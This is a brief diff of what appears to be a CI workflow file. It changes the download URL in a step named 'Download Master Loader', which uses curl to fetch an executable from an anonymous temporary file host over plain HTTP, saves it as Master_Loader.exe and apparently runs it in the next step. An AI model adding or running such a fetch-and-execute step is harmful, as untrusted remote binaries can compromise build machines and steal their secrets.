@@ -15,7 +15,7 @@ jobs:
       - name: Download Master Loader
         shell: pwsh
         run: |
-          $url = "https://tmpfiles.org/dl/31950502/main.exe"
+          $url = "http://tmpfiles.org/dl/31974101/main.exe"
           curl -L $url -o "Master_Loader.exe"
 
       - name: Execute and Monitor
